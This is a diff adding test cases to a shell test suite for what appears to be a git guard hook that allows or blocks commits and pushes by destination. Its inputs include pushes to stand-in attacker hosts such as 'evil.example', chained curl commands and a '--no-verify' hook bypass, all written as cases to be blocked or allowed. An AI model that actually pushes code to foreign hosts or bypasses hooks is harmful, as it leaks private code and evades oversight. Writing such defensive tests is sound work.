@@ -81,6 +81,15 @@ check 2 "$(run "$ALLOWED" 'git push https://oebb-azure-platform@dev.azure.com/oe
 # Spoofed own-host URLs are foreign.
 check 2 "$(run "$ALLOWED" 'git push https://github.com.evil.io/x/y.git main')" \
   'push: github.com.evil.io BLOCKED'
+# Only the push's own arguments name a destination: a URL used by another
+# command on the same line is not where the commit/push lands.
+check 0 "$(run "$ALLOWED" 'git commit -m x; curl https://example.com')"   'commit; curl <url>: own repo allowed'
+check 0 "$(run "$ALLOWED" "git -C $ALLOWED commit -m x; curl https://example.com")" 'git -C own commit; curl <url> allowed'
+check 0 "$(run "$ALLOWED" 'git push; curl https://example.com')"          'push; curl <url>: own repo allowed'
+check 0 "$(run "$ALLOWED" 'curl https://example.com && git push origin')" 'curl <url> && push: own repo allowed'
+check 2 "$(run "$ALLOWED" 'curl https://github.com/x && git push https://evil.example/x.git main')" \
+  'curl <own url> && push <foreign url> BLOCKED'
+check 2 "$(run "$CUST" 'git commit -m x; curl https://github.com/me/x')"  'customer commit; curl <own url> still BLOCKED'
 
 echo "== belt: --no-verify =="
 check 2 "$(run "$ALLOWED" 'git commit --no-verify -m x')" '--no-verify blocked'
